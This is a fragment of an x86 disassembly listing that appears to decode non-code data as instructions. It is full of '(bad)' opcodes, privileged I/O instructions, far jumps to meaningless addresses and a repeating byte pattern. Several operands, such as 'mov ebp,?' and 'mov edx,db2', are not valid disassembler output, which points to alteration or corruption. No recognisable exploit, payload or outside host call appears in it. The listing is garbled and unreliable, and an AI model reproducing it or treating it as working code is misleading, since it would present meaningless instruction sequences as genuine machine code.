  41ece5:	jp     0x41ec9d
  41ece7:	mov    BYTE PTR [ebx-0x42],dh
  41ecea:	adc    BYTE PTR [ecx],bh
  41ecec:	sbb    al,BYTE PTR [eax]
	...
  41ed56:	inc    ecx
  41ed57:	icebp  
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0x73205fd0
  41ed64:	(bad)  
  41ed65:	loope  0x41ed5a
  41ed67:	dec    edx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	inc    DWORD PTR [eax]
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	mov    dh,0x24
  41ed70:	push   ds
  41ed71:	xchg   ecx,eax
  41ed72:	pushf  
  41ed73:	or     eax,0x6844f624
  41ed78:	fsubr  st(1),st
  41ed7a:	and    al,dh
  41ed7c:	and    BYTE PTR [esi+0x6ad56218],bh
  41ed82:	or     cl,BYTE PTR [edx-0x2a]
  41ed85:	sbb    ebx,DWORD PTR [ebx-0x4a]
  41ed88:	je     0x41ede1
  41ed8a:	inc    edi
  41ed8b:	pusha  
  41ed8c:	xor    BYTE PTR [edi-0x1c],0x0
  41ed90:	outs   dx,BYTE PTR ds:[esi]
  41ed91:	inc    esp
  41ed92:	inc    eax
  41ed93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed94:	adc    edi,0xffffff80
  41ed97:	pop    ss
  41ed98:	push   edi
  41ed99:	mov    esi,0x890abeb9
  41ed9e:	mov    cl,0xef
  41eda0:	add    DWORD PTR [edx+0x1aec85e6],edx
  41eda6:	int    0xe6
  41eda8:	pop    esi
  41eda9:	xlat   BYTE PTR ds:[ebx]
  41edaa:	mov    esp,0x99ee4e86
  41edaf:	mov    esi,0xcc10935c
  41edb4:	dec    esp
  41edb5:	jb     0x41ee0e
  41edb7:	adc    ebx,DWORD PTR [esi]
  41edb9:	push   0xffffff99
  41edbb:	sub    al,0x85
  41edbd:	imul   edx,DWORD PTR [edi+0x6c],0xd035958a
  41edc4:	jo     0x41edf3
  41edc6:	sub    esi,DWORD PTR [esi-0x2cf9afc2]
  41edcc:	mov    esi,0x17d424b3
  41edd1:	xchg   DWORD PTR [esi],esp
  41edd3:	xor    eax,0x51879a79
  41edd8:	pop    esp
  41edd9:	test   DWORD PTR [esi+esi*4],ecx
  41eddc:	daa    
  41eddd:	or     BYTE PTR [edx-0x765a11c8],al
  41ede3:	aas    
  41ede4:	outs   dx,BYTE PTR ds:[esi]
  41ede5:	xchg   edi,eax
  41ede6:	mul    edi
  41ede8:	dec    esi
  41ede9:	or     al,0x7f
  41edeb:	fmul   DWORD PTR [esi-0x58fe722b]
  41edf1:	fistp  QWORD PTR [edx+0xc848e9e]
  41edf7:	sbb    eax,0x6962d094
  41edfc:	dec    ebx
  41edfd:	lock jns 0x41ee68
  41ee00:	sbb    ebx,DWORD PTR [ecx+0x17f26ffd]
  41ee06:	pop    edx
  41ee07:	loop   0x41ee5e
  41ee09:	jne    0x41ed90
  41ee0b:	mov    ds:0x70b1841e,eax
  41ee10:	push   ebx
  41ee11:	pop    ebp
  41ee12:	or     eax,0xbfb9692b
  41ee17:	in     eax,0x6f
  41ee19:	xchg   dl,al
  41ee1b:	add    bh,cl
  41ee1d:	sub    dl,ch
  41ee1f:	lock or ah,BYTE PTR [ecx+0x4d]
  41ee23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee24:	hlt    
  41ee25:	pop    esp
  41ee26:	mov    ebx,0xd219e9a5
  41ee2b:	retf   
  41ee2c:	stc    
  41ee2d:	shl    bh,1
  41ee2f:	lea    edx,ss:[ecx-0x762bdd73]
  41ee36:	in     eax,0x83
  41ee38:	add    DWORD PTR [eax-0x1e],0x5e
  41ee3c:	leave  
  41ee3d:	(bad)  
  41ee3e:	fdivr  DWORD PTR [ebx]
  41ee40:	xchg   esp,eax
  41ee41:	call   0x9693c50d
  41ee46:	pop    DWORD PTR [ebx]
  41ee48:	fistp  QWORD PTR [ecx-0x55]
  41ee4b:	jle    0x41ee31
  41ee4d:	hlt    
  41ee4e:	in     al,dx
  41ee4f:	(bad)  
  41ee50:	neg    BYTE PTR [edx]
  41ee52:	loop   0x41ee77
  41ee54:	mov    ah,0x44
  41ee56:	sbb    BYTE PTR [edx-0x34],cl
  41ee59:	sbb    eax,0xb8ab2c82
  41ee5e:	ins    BYTE PTR es:[edi],dx
  41ee5f:	jmp    0x9203:0xdcbae906
  41ee66:	mov    dh,0x2f
  41ee68:	mov    ebp,0x367262d0
	...
  41eed5:	add    BYTE PTR ds:0x7b197956,al
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0xf2b6:0xa75d79e7
  41eee7:	dec    ebx
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	inc    DWORD PTR [eax]
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	mov    ebp,?
  41eef0:	mov    ebp,0x198e009d
  41eef5:	gs push edx
  41eef7:	adc    eax,0x7de722e9
  41eefc:	mov    ch,0x3
  41eefe:	pushf  
  41eeff:	or     al,0x7d
  41ef01:	cmp    eax,0xf80b0ec9
  41ef06:	inc    ebx
  41ef07:	daa    
  41ef08:	enter  0x215e,0x2a
  41ef0c:	sub    al,0x2a
  41ef0e:	adc    esp,ecx
  41ef10:	das    
  41ef11:	lock adc DWORD PTR [edx+eiz*4+0x48],edx
  41ef16:	sti    
  41ef17:	mov    bl,0xad
  41ef19:	xlat   BYTE PTR ds:[ebx]
  41ef1a:	pusha  
  41ef1b:	jmp    0x9722:0xb3242cc2
  41ef22:	cmp    BYTE PTR [esi],0x83
  41ef25:	push   ds
  41ef26:	inc    esp
  41ef27:	push   0x5d
  41ef29:	mov    fs:0x99bb4d0c,eax
  41ef2f:	nop
  41ef30:	xor    al,BYTE PTR [esi]
  41ef32:	or     eax,0x9b722984
  41ef37:	ret    0x28cc
  41ef3a:	and    BYTE PTR [ecx+0xf],0xc4
  41ef3e:	fidivr DWORD PTR [eax+0x7238b13d]
  41ef44:	popf   
  41ef45:	dec    edi
  41ef46:	mov    dl,0x4a
  41ef48:	push   es
  41ef49:	push   ds
  41ef4a:	xor    bl,BYTE PTR [ecx]
  41ef4c:	push   0x14
  41ef4e:	(bad)  
  41ef4f:	sbb    al,0xee
  41ef51:	repnz bound eax,QWORD PTR [ecx+0x1ba867c5]
  41ef58:	xchg   DWORD PTR [edi+edi*4+0x350ee614],edx
  41ef5f:	adc    esi,esi
  41ef61:	mov    eax,ds:0xf9020e0
  41ef66:	mov    edi,0x4363010e
  41ef6b:	lahf   
  41ef6c:	icebp  
  41ef6d:	out    0xc4,al
  41ef6f:	stos   BYTE PTR es:[edi],al
  41ef70:	sbb    DWORD PTR [edi-0x48],ecx
  41ef73:	stos   DWORD PTR es:[edi],eax
  41ef74:	in     eax,0x81
  41ef76:	mov    BYTE PTR [ecx],cl
  41ef78:	xlat   BYTE PTR ds:[ebx]
  41ef79:	scas   al,BYTE PTR es:[edi]
  41ef7a:	jl     0x41efc2
  41ef7c:	mov    edx,db2
  41ef7f:	push   edx
  41ef80:	leave  
  41ef81:	adc    BYTE PTR [esp+eax*8+0x7ebdc056],dh
  41ef88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef89:	data16 adc BYTE PTR [esi],dh
  41ef8c:	cdq    
  41ef8d:	outs   dx,BYTE PTR ds:[esi]
  41ef8e:	pop    ebp
  41ef8f:	dec    esp
  41ef90:	ss xchg esp,eax
  41ef92:	arpl   si,bp
  41ef94:	and    DWORD PTR [edx-0x62],eax
  41ef97:	retf   
  41ef98:	aas    
  41ef99:	js     0x41efd5
  41ef9b:	shr    BYTE PTR [esp+esi*8],0x93
  41ef9f:	mov    ch,0xd
  41efa1:	push   0xffffff8c
  41efa3:	mov    esp,edx
  41efa5:	repz in eax,dx
  41efa7:	es fcmovbe st,st(4)
  41efaa:	and    al,0x8f
  41efac:	mov    esi,0x5a9aae0b
  41efb1:	loopne 0x41ef65
  41efb3:	ins    BYTE PTR es:[edi],dx
  41efb4:	or     eax,0x6cc3155
  41efb9:	push   ds
  41efba:	daa    
  41efbb:	mov    WORD PTR [edx+0x1],fs
  41efbe:	ficom  DWORD PTR [ecx]
  41efc0:	push   esi
  41efc1:	pop    es
  41efc2:	sub    DWORD PTR [ecx],ebp
  41efc4:	inc    esi
  41efc5:	push   esi
  41efc6:	sar    ebp,1
  41efc8:	fisttp QWORD PTR [esi+0x24efea7d]
  41efce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efcf:	mov    DWORD PTR [eax-0x1],esi
  41efd2:	inc    eax
  41efd3:	xlat   BYTE PTR ds:[ebx]
  41efd4:	dec    ecx
  41efd5:	ret    0xb80e
  41efd8:	stc    
  41efd9:	outs   dx,BYTE PTR ds:[esi]
  41efda:	loop   0x41f043
  41efdc:	fcmovu st,st(3)
  41efde:	aam    0xf
  41efe0:	cmp    al,BYTE PTR [edi-0x59]
  41efe3:	sbb    ch,dl
  41efe5:	das    
  41efe6:	mov    gs,WORD PTR [ecx]
  41efe8:	stos   BYTE PTR es:[edi],al
  41efe9:	div    BYTE PTR [eax-0x23]
  41efec:	add    DWORD PTR [eax],eax
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul esp,DWORD PTR [edi],0x4e
  41f064:	je     0x41f0ce
  41f066:	icebp  
  41f067:	dec    esp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	inc    DWORD PTR [eax]
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	jnp    0x41f077
  41f070:	mov    eax,0x651f4d5d
  41f075:	fidiv  WORD PTR [eax]
  41f077:	mov    ecx,0xf332ba0d
  41f07c:	cwde   
  41f07d:	out    0x69,eax
  41f07f:	(bad)  
  41f081:	cmp    BYTE PTR [esi],bl
  41f083:	outs   dx,BYTE PTR ds:[esi]
  41f084:	fbld   TBYTE PTR [eax-0x2c]
  41f087:	sub    BYTE PTR [ebp+0x2a],ah
  41f08a:	mov    ah,0x13
  41f08c:	fwait
  41f08d:	or     BYTE PTR [ecx-0x42ccec84],ah
  41f093:	push   ebx
  41f094:	pop    edx
  41f095:	mov    WORD PTR [edx],ds
  41f097:	mov    ch,0x1c
  41f099:	pop    ss
  41f09a:	icebp  
  41f09b:	inc    esi
  41f09c:	jle    0x41f07a
  41f09e:	pop    ds
  41f09f:	cs dec esp
  41f0a1:	xor    BYTE PTR [edx-0x5f84b4c],0x79
  41f0a8:	xchg   ebx,eax
  41f0a9:	xchg   ebp,eax
  41f0aa:	stc    
  41f0ab:	imul   edi,DWORD PTR [edi-0xc],0xffffff9c
  41f0af:	cmp    ah,BYTE PTR [edi-0x2c057621]
  41f0b5:	int    0x6e
  41f0b7:	cs push edi
  41f0b9:	xor    BYTE PTR [ecx+0x30f400a2],cl
  41f0bf:	push   ebx
  41f0c0:	js     0x41f141
  41f0c2:	dec    ebx
  41f0c3:	and    BYTE PTR [ecx-0x6cd16e23],ah
  41f0c9:	outs   dx,DWORD PTR ds:[esi]
  41f0ca:	mov    WORD PTR [ecx-0x41da6839],ss
  41f0d0:	leave  
  41f0d1:	push   ds
  41f0d2:	xchg   DWORD PTR [ebx+0x65ab9bdd],ebx
  41f0d8:	pop    esp
  41f0d9:	loope  0x41f0c3
  41f0db:	push   esi
  41f0dc:	inc    edx
  41f0dd:	and    DWORD PTR [eax-0x29],0xfffffff0
  41f0e1:	mov    eax,ds:0x7be49af9
  41f0e6:	cmp    BYTE PTR [ebx+0x5e],bl
  41f0e9:	outs   dx,DWORD PTR cs:[esi]
  41f0eb:	or     eax,0xc931cea9
  41f0f0:	daa    
  41f0f1:	(bad)  
  41f0f2:	(bad)  
  41f0f3:	loope  0x41f0db
  41f0f5:	adc    ch,BYTE PTR [ebx+0x2e1ba5c]
  41f0fb:	sub    eax,0x1fca1fda
  41f100:	mov    eax,0xd393c6ab
  41f105:	ds adc al,0xa
  41f108:	fcmovne st,st(5)
  41f10a:	cmc    
  41f10b:	int    0xe0
  41f10d:	lods   eax,DWORD PTR ds:[esi]
  41f10e:	and    BYTE PTR [eax-0x4a65a19f],dl
  41f114:	jmp    0xc5973b45
  41f119:	repnz test ebp,ebx
  41f11c:	or     dl,BYTE PTR [ebx]
  41f11e:	div    DWORD PTR [ebx-0x41]
  41f121:	retf   0x1ed5
  41f124:	push   edi
  41f125:	cld    
  41f126:	pushf  
  41f127:	pop    ecx
  41f128:	adc    BYTE PTR [edx],bh
  41f12a:	mov    ds:0xc496d2d0,eax
  41f12f:	and    eax,0x288b717e
  41f134:	mov    ch,0xdc
  41f136:	mov    ?,ebx
  41f138:	aad    0xb0
  41f13a:	pop    edi
  41f13b:	and    DWORD PTR [ecx],0x630af84
  41f141:	rol    DWORD PTR [ecx+0x3893224f],cl
  41f147:	aas    
  41f148:	xchg   ebp,eax
  41f149:	out    dx,al
  41f14a:	int    0x79
  41f14c:	xor    eax,0xd6e91df2
  41f151:	aam    0xee
  41f153:	pop    edx
  41f154:	in     al,0x73
  41f156:	mov    ebp,DWORD PTR ds:0xf1e90a80
  41f15c:	lods   al,BYTE PTR ds:[esi]
  41f15d:	xor    dl,BYTE PTR ss:[edx+0x2087b0a8]
  41f164:	pop    eax
  41f165:	call   DWORD PTR ss:[edi]
  41f168:	stos   DWORD PTR es:[edi],eax
  41f169:	dec    ebp
  41f16a:	cmp    dh,ah
  41f16c:	xchg   DWORD PTR [eax],eax
	...
  41f1d6:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4df0:0xbfe6384d
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	inc    DWORD PTR [eax]
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	sub    ch,0xdd
  41f1f1:	jmp    0x109da8e6
  41f1f6:	sbb    al,BYTE PTR [ecx-0x1deddb77]
  41f1fc:	scas   eax,DWORD PTR es:[edi]
  41f1fd:	loop   0x41f22f
  41f1ff:	es stc 
  41f201:	ret    0x6e67
  41f204:	dec    edx
  41f205:	repz inc edx
  41f207:	ss pushf 
  41f209:	(bad)  
  41f20a:	test   eax,0x6515b006
  41f20f:	dec    eax
  41f210:	sbb    bl,BYTE PTR [eax-0x4fdb6cd9]
  41f216:	sti    
  41f217:	loopne 0x41f1e9
  41f219:	xor    edi,ecx
  41f21b:	int3   
  41f21c:	xor    al,0xc7
  41f21e:	add    al,0xd0
  41f220:	inc    esi
  41f221:	push   esi
  41f222:	ds inc ecx
  41f224:	mov    ebp,0x25421d87
  41f229:	call   0xa784a933
  41f22e:	iret   
  41f22f:	lock jbe 0x41f1b2
  41f232:	inc    ebp
  41f233:	cmp    eax,0xcafc3ba6
  41f238:	or     edi,ecx
  41f23a:	jns    0x41f288
  41f23c:	ds popf 
  41f23e:	add    esi,DWORD PTR [ebp+eiz*4+0x38]
  41f242:	lahf   
  41f243:	mov    edi,0x7497dbe1
  41f248:	leave  
  41f249:	test   ah,al
  41f24b:	mov    ch,0xcc
  41f24d:	stos   DWORD PTR es:[edi],eax
  41f24e:	xchg   esp,eax
  41f24f:	mov    eax,0x71312abe
  41f254:	add    DWORD PTR [edx+0x19],0x4e2a8300
  41f25b:	fadd   QWORD PTR [edx-0x2403eb26]
  41f261:	jmp    0x41f22e
  41f263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f264:	mov    ch,0xd8
  41f266:	repz cwde 
  41f268:	adc    ah,al
  41f26a:	xlat   BYTE PTR ds:[ebx]
  41f26b:	fsub   QWORD PTR [ecx]
  41f26d:	bound  ebp,QWORD PTR [eax-0x637b89c3]
  41f273:	mov    edi,0xeacaf1e6
  41f278:	jae    0x41f2d7
  41f27a:	add    bh,BYTE PTR [ecx+ebx*8+0x63]
  41f27e:	jmp    0x41f257
  41f280:	inc    esi
  41f281:	sub    DWORD PTR [esp+edx*8+0x41],eax
  41f285:	mov    WORD PTR [edx],ss
  41f287:	aas    
  41f288:	adc    dl,bl
  41f28a:	or     al,0xc0
  41f28c:	or     ebp,DWORD PTR [ebp+0x21]
  41f28f:	mov    ecx,DWORD PTR [ebx+0xa87c06f]
  41f295:	push   edx
  41f296:	fist   DWORD PTR [ebx-0x2dc1189]
  41f29c:	cmp    BYTE PTR [eax-0x181cc360],dl
  41f2a2:	cmp    edi,ecx
  41f2a4:	cmp    eax,0x586a4355
  41f2a9:	push   esi
  41f2aa:	inc    eax
  41f2ab:	sahf   
  41f2ac:	push   eax
  41f2ad:	xchg   BYTE PTR [edx],ah
  41f2af:	mov    esi,0xc4c57baa
  41f2b4:	jmp    0x14bb19bc
  41f2b9:	push   edi
  41f2ba:	sbb    DWORD PTR ds:0x447e07e3,ecx
  41f2c0:	in     al,0xda
  41f2c2:	pop    esp
  41f2c3:	xchg   ecx,eax
  41f2c4:	into   
  41f2c5:	xchg   ecx,esp
  41f2c7:	inc    esp
  41f2c8:	cwde   
  41f2c9:	fmul   QWORD PTR [ebx+edi*2-0x26ecd466]
  41f2d0:	or     ebx,esp
  41f2d2:	sti    
  41f2d3:	bound  edi,QWORD PTR [ebx+0xe39e2e1]
  41f2d9:	retf   
  41f2da:	icebp  
  41f2db:	imul   ecx,DWORD PTR [ecx+0x4],0xcc2b9edc
  41f2e2:	loope  0x41f303
  41f2e4:	loop   0x41f30d
  41f2e6:	rcr    BYTE PTR [ebx],1
  41f2e8:	out    0x3a,al
  41f2ea:	push   esi
  41f2eb:	das    
  41f2ec:	dec    esi
	...
  41f355:	add    BYTE PTR [ecx+0x1b],dl
  41f358:	jmp    DWORD PTR [esi-0x1]
  41f35b:	out    0xd9,al
  41f35d:	aas    
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f323
  41f363:	je     0x41f32f
  41f365:	ins    BYTE PTR es:[edi],dx
  41f366:	out    dx,eax
  41f367:	dec    esi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	inc    DWORD PTR [eax]
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	sbb    al,0x8e
  41f370:	mov    WORD PTR [ecx-0x4612412e],es
  41f376:	iret   
  41f377:	in     eax,dx
  41f378:	out    0xfa,al
  41f37a:	je     0x41f34f
  41f37c:	mov    ah,0x16
  41f37e:	xchg   ebx,eax
  41f37f:	scas   eax,DWORD PTR es:[edi]
  41f380:	fwait
  41f381:	pop    ebp
  41f382:	cmp    al,0x37
  41f384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f385:	pop    es
  41f386:	sub    DWORD PTR [edx+0x5a452c0d],edi
  41f38c:	push   edi
  41f38d:	or     al,0xf2
  41f38f:	mov    cl,0xbf
  41f391:	mov    bh,bh
  41f393:	loopne 0x41f3c8
  41f395:	daa    
  41f396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f397:	inc    ebx
  41f398:	test   BYTE PTR [eax+0x5eb155fc],bl
  41f39e:	sub    eax,0xaa87e7a8
  41f3a3:	ror    DWORD PTR [ecx-0x13],0xe4
  41f3a7:	dec    esp
  41f3a8:	fisttp DWORD PTR [ebx]
  41f3aa:	fs adc dl,ch
  41f3ad:	pop    edi
  41f3ae:	jle    0x41f3a1
  41f3b0:	inc    esp
  41f3b1:	xchg   edi,eax
  41f3b2:	inc    ebx
  41f3b3:	dec    esp
  41f3b4:	stc    
  41f3b5:	xor    bh,dh
  41f3b7:	or     BYTE PTR [ecx+0x12c43dda],0xda
  41f3be:	inc    ecx
  41f3bf:	(bad)  
  41f3c0:	das    
  41f3c1:	bound  esp,QWORD PTR [edx]
  41f3c3:	pop    es
  41f3c4:	xchg   edx,eax
  41f3c5:	test   al,0x72
  41f3c7:	and    BYTE PTR [ecx+0x4c1a19b4],0xb3
  41f3ce:	sbb    al,0x89
  41f3d0:	pop    ds
  41f3d1:	inc    ebx
  41f3d2:	cli    
  41f3d3:	cld    
  41f3d4:	(bad)  
  41f3d5:	jmp    0x41f389
  41f3d7:	mov    bh,0x4
  41f3d9:	rcl    edi,cl
  41f3db:	adc    BYTE PTR [ebx+0x6a88f880],bh
  41f3e1:	(bad)  
  41f3e2:	jl     0x41f3d0
  41f3e4:	in     al,dx
  41f3e5:	mov    ds:0xe1e6d9e6,al
  41f3ea:	mov    esp,db1
  41f3ed:	pushf  
  41f3ee:	pop    edx
  41f3ef:	or     BYTE PTR [ecx-0x6e08b6ea],dl
  41f3f5:	sbb    al,0xe
  41f3f7:	pushf  
  41f3f8:	test   esp,edx
  41f3fa:	dec    esi
  41f3fb:	fidivr WORD PTR [ebx]
  41f3fd:	ret    
  41f3fe:	sub    eax,0x674047fd
  41f403:	inc    esi
  41f404:	ins    BYTE PTR es:[di],dx
  41f406:	inc    esp
  41f407:	outs   dx,DWORD PTR ds:[esi]
  41f408:	mov    esp,0xbf0e1bba
  41f40d:	jge    0x41f437
  41f40f:	outs   dx,BYTE PTR ds:[esi]
  41f410:	mov    BYTE PTR [esi+0x488d7fd5],ah
  41f416:	adc    bh,BYTE PTR [ecx+0x5e]
  41f419:	sbb    esp,DWORD PTR [edx+0x102c312b]
  41f41f:	ficomp WORD PTR fs:[ecx]
  41f422:	adc    edi,DWORD PTR [ebx-0x6f00d57e]
  41f428:	rcr    BYTE PTR [edi+edi*1-0x5cdc8f9d],1
  41f42f:	je     0x41f435
  41f431:	add    ebx,DWORD PTR [edi]
  41f433:	cmp    al,0x7d
  41f435:	xchg   ebx,eax
  41f436:	out    0xbb,al
  41f438:	iret   
  41f439:	std    
  41f43a:	int3   
  41f43b:	ds adc eax,0xded3fc47
  41f441:	(bad)  
  41f442:	(bad)  
  41f443:	push   ds
  41f444:	mov    esi,0xe4a53032
  41f449:	cmp    BYTE PTR [eax-0x223a605b],cl
  41f44f:	jl     0x41f3da
  41f451:	sub    DWORD PTR [ecx+0xd],eax
  41f454:	out    dx,eax
  41f455:	mov    ebp,0xf3012f28
  41f45a:	fcomip st,st(5)
  41f45c:	xor    al,BYTE PTR [ebx]
  41f45e:	call   0xd3f6:0x5716dade
  41f465:	aad    0x51
  41f467:	loop   0x41f407
  41f469:	and    al,0xd7
  41f46b:	fdiv   DWORD PTR [edx+0x0]
	...
  41f4d6:	cmp    al,0xe7
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0x64
  41f4e3:	scas   al,BYTE PTR es:[edi]
  41f4e4:	pop    edx
  41f4e5:	hlt    
  41f4e6:	out    dx,al
  41f4e7:	dec    edi
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	inc    DWORD PTR [eax]
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	push   edx
  41f4ef:	(bad)  
  41f4f0:	inc    esi
  41f4f1:	jne    0x41f4c3
  41f4f3:	cmc    
  41f4f4:	mov    al,0xcc
  41f4f6:	test   al,0x79
  41f4f8:	sub    dl,BYTE PTR [ebp+ecx*1-0x1da324a2]
  41f4ff:	inc    ebx
  41f500:	pushf  
  41f501:	dec    ebp
  41f502:	test   al,0x64
  41f504:	mov    ah,0x16
  41f506:	pop    es
  41f507:	mov    fs,WORD PTR [edi]
  41f509:	call   0x578c2887
  41f50e:	xchg   ebp,eax
  41f50f:	aad    0x11
  41f511:	imul   ebp,DWORD PTR [ecx],0xffffffe3
  41f514:	add    eax,DWORD PTR [ecx+eiz*4]
  41f517:	push   esi
  41f518:	js     0x41f4aa
  41f51a:	stos   DWORD PTR es:[edi],eax
  41f51b:	push   0x266d11ed
  41f520:	dec    ebp
  41f521:	int3   
  41f522:	data16 int3 
  41f524:	pop    ebx
  41f525:	rcl    DWORD PTR [edi+0x3b],cl
  41f528:	cli    
  41f529:	pop    ebp
  41f52a:	cmp    al,0x56
  41f52c:	push   eax
  41f52d:	fs or  al,0x21
  41f530:	xchg   DWORD PTR [ecx-0x5d],edi
  41f533:	cs in  eax,0xd7
  41f536:	out    0xca,eax
  41f538:	sub    BYTE PTR [ebx+0x6d56e877],ch
  41f53e:	pop    eax
  41f53f:	adc    esi,DWORD PTR [esi+0xb38b820]
  41f545:	pop    edi
  41f546:	int    0xa6
  41f548:	lods   al,BYTE PTR ds:[esi]
  41f549:	or     BYTE PTR [eax+0x20],0x50
  41f54d:	inc    esi
  41f54e:	jmp    0x9c7c:0x4d018dc1
  41f555:	xchg   edx,eax
  41f556:	push   ecx
  41f557:	cmc    
  41f558:	jle    0x41f575
  41f55a:	xor    eax,0x5430683b
  41f55f:	inc    edi
  41f560:	mov    bh,0xe0
  41f562:	rol    BYTE PTR [edi+edx*4+0x40],1
  41f566:	jno    0x41f5a2
  41f568:	push   es
  41f569:	inc    ebp
  41f56a:	fwait
  41f56b:	inc    eax
  41f56c:	mul    DWORD PTR [esi+0x423a1772]
  41f572:	out    0x29,eax
  41f574:	cmp    al,0x84
  41f576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f577:	cdq    
  41f578:	pop    edx
  41f579:	pop    esp
  41f57a:	mov    al,0xfe
  41f57c:	dec    ebp
  41f57d:	std    
  41f57e:	dec    eax
  41f57f:	retf   0x23f1
  41f582:	cs cmp eax,0x9e1c573d
  41f588:	or     al,0x80
  41f58a:	jle    0x41f589
  41f58c:	pop    es
  41f58d:	test   DWORD PTR [edx-0x78d49951],eax
  41f593:	imul   edx,DWORD PTR [edi+0x4a715e3c],0x21
  41f59a:	cmp    al,0xc1
  41f59c:	xor    al,0x90
  41f59e:	js     0x41f585
  41f5a0:	xor    edx,DWORD PTR [esi+0x67]
  41f5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5a4:	je     0x41f561
  41f5a6:	jne    0x41f60e
  41f5a8:	gs or  ecx,0xf5fa1fed
  41f5af:	in     al,0x40
  41f5b1:	push   edi
  41f5b2:	dec    edi
  41f5b3:	fwait
  41f5b4:	or     al,BYTE PTR gs:[esi+0x40568fac]
  41f5bb:	ror    BYTE PTR [edi+0x6f7c7588],cl
  41f5c1:	cmp    DWORD PTR [edi-0x670e4441],eax
  41f5c7:	(bad)  
  41f5c8:	int3   
  41f5c9:	pop    esi
  41f5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5cb:	adc    bh,dl
  41f5cd:	pop    edi
  41f5ce:	lock imul ebp,DWORD PTR [esi],0x5d
  41f5d2:	mov    dl,0x43
  41f5d4:	scas   eax,DWORD PTR es:[edi]
  41f5d5:	and    esp,esi
  41f5d7:	les    ebx,FWORD PTR [ebx+0x7]
  41f5da:	mov    bh,0xf7
  41f5dc:	mov    dl,0x86
  41f5de:	adc    bh,BYTE PTR [ecx]
  41f5e0:	add    ecx,DWORD PTR ds:[edx-0x4d]
  41f5e4:	or     eax,0x26f6952e
  41f5e9:	xor    BYTE PTR [ecx+eiz*1],bl
  41f5ec:	pop    esi
	...
  41f655:	add    BYTE PTR [eax+0x34],bh
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x5504:0x9077d422
  41f666:	in     eax,dx
  41f667:	push   eax
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	inc    DWORD PTR [eax]
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	leave  
  41f66f:	inc    ebx
  41f670:	add    BYTE PTR [edx+0x2b],al
  41f673:	sti    
  41f674:	xor    al,0x60
  41f676:	out    dx,eax
  41f677:	test   al,0xcc
  41f679:	lea    ebx,[ebp-0x5a]
  41f67c:	dec    edi
  41f67d:	neg    edi
  41f67f:	(bad)  
  41f680:	enter  0x124e,0x8c
  41f684:	xchg   ebx,eax
  41f685:	ret    
  41f686:	sbb    ecx,DWORD PTR [ecx]
  41f688:	mov    eax,0xff36ce36
  41f68d:	fldcw  WORD PTR [ecx]
  41f68f:	div    BYTE PTR [edx-0x4dc22d54]
  41f695:	adc    DWORD PTR [ebx],esi
  41f697:	inc    edx
  41f698:	or     DWORD PTR [edi],ecx
  41f69a:	mov    esi,0x46daf21e
  41f69f:	in     eax,dx
  41f6a0:	add    BYTE PTR [esi-0x1c],al
  41f6a3:	retf   
  41f6a4:	hlt    
  41f6a5:	jne    0x41f70b
  41f6a7:	xchg   edi,eax
  41f6a8:	(bad)  
  41f6a9:	fistp  WORD PTR [ebx-0x449df5be]
  41f6af:	mov    edx,0x20ab963b
  41f6b4:	xchg   edx,eax
  41f6b5:	js     0x41f6a2
  41f6b7:	fdivr  st,st(7)
  41f6b9:	inc    ebp
  41f6ba:	pop    ecx
  41f6bb:	aad    0x85
  41f6bd:	test   al,0x87
  41f6bf:	xor    eax,0xa0bef858
  41f6c4:	inc    esi
  41f6c5:	rcl    BYTE PTR [edx],1
  41f6c7:	cli    
  41f6c8:	push   esp
  41f6c9:	ins    BYTE PTR es:[edi],dx
  41f6ca:	xor    al,0xc8
  41f6cc:	xchg   BYTE PTR [ecx],al
  41f6ce:	(bad)  
  41f6cf:	in     al,dx
  41f6d0:	pop    ds
  41f6d1:	xor    BYTE PTR [ecx-0x5c],ah
  41f6d4:	punpcklwd mm5,mm1
  41f6d7:	xor    edx,DWORD PTR [edi+0x267e69e]
  41f6dd:	cld    
  41f6de:	retf   
  41f6df:	sahf   
  41f6e0:	sbb    al,BYTE PTR [eax+ebx*4+0x2d]
  41f6e4:	push   edx
  41f6e5:	pop    esi
  41f6e6:	cmp    DWORD PTR [eax],eax
  41f6e8:	pop    es
  41f6e9:	(bad)  
  41f6ea:	jecxz  0x41f718
  41f6ec:	mov    ch,0x1f
